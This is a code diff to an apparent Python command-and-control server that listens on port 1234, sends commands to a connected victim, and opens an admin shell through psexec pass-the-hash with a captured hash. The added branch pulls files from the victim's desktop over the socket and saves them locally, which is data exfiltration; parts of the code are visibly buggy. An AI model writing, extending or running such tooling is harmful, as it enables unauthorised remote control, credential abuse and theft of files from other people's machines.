@@ -4,12 +4,14 @@ import subprocess
 from subprocess import call
 import os
 
+
 def connectToMachine():
     hashToEnter = input("Enter the hash received: ")
     userName = input("Enter the name of the user with admin rights: ")
     dir = os.getcwd()
     cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address[0] + " cmd.exe"
     subprocess.Popen(cmnd, cwd=dir, shell=True)
+
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0", 1234))
@@ -30,18 +32,36 @@ while True:
     # If the correct account is chosen, this terminal will have admin privileges
     if msgToSend == "getaccess":
         connectToMachine()
+    elif msgToSend == "SendFiles-Desktop":
+        clientsocket.send(bytes(msgToSend, "utf-8"))
+        decodedMsg = msg.decode("utf-8")
+        print(decodedMsg)
+        msgToSend = input("Enter your message: ")
+        if msgToSend == 'cancel':
+            clientsocket.send(bytes(msgToSend, "utf-8"))
+        else:
+            f = open(input("your directory:") + msgToSend, 'wb')
+            clientsocket.send(bytes(msgToSend, "utf-8"))
+            msg = clientsocket.recv(1024)
+            decodedMsg = msg.decode("utf-8")
+            while decodedMsg != "done sending":
+                f.write(decodedMsg)
+                msg = clientsocket.recv(1024)
+                decodedMsg = msg.decode("utf-8")
+
+
+
+
+
     ################################################################
     # Closes the socket and terminates the connection (hopefully) ##
     elif msgToSend == "terminate":
         s.close()
         break
     #################################################################
-
-    clientsocket.send(bytes(msgToSend,"utf-8"))
-    #this does not work currently since it gets an error
-    msg = clientsocket.recv(1024)
-    decodedMsg = msg.decode("utf-8")
-    print(decodedMsg)
-
-
-
+    else:
+        clientsocket.send(bytes(msgToSend, "utf-8"))
+        # this does not work currently since it gets an error
+        msg = clientsocket.recv(1024)
+        decodedMsg = msg.decode("utf-8")
+        print(decodedMsg)
